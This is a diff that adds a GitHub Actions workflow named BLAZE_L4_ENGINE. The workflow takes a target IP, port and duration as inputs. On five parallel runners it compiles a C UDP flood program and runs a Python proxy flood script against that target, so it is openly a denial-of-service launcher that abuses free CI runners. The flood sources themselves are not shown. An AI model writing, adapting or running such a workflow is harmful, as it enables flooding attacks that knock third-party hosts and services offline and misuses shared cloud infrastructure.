@@ -1,0 +1,30 @@
+name: BLAZE_L4_ENGINE
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        required: true
+        type: string
+      port:
+        required: true
+        type: string
+      duration:
+        required: true
+        type: string
+
+jobs:
+  blaze_flood:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        node: [1, 2, 3, 4, 5]
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Compile & Fire Multi-IP Proxy + C UDP Flood
+        run: |
+          pip install requests >/dev/null 2>&1 || true
+          gcc flood.c -o flood -lpthread -O3
+          python3 proxy_flood.py ${{ inputs.ip }} ${{ inputs.port }} ${{ inputs.duration }} &
+          ./flood ${{ inputs.ip }} ${{ inputs.port }} ${{ inputs.duration }} 150
